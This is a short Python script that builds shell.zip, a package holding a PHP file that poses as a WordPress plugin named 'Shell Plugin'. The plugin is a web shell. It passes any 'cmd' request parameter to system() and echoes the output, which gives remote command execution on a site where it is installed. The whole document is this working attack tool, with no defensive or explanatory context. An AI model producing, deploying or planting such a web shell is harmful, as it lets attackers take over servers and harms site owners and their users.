import zipfile

shell_php = """<?php
/**
 * Plugin Name: Shell Plugin
 * Version: 1.0
 * Author: Antigravity
 */

if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    exit;
}
?>"""

with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('shell/shell.php', shell_php)

print("Created shell.zip")
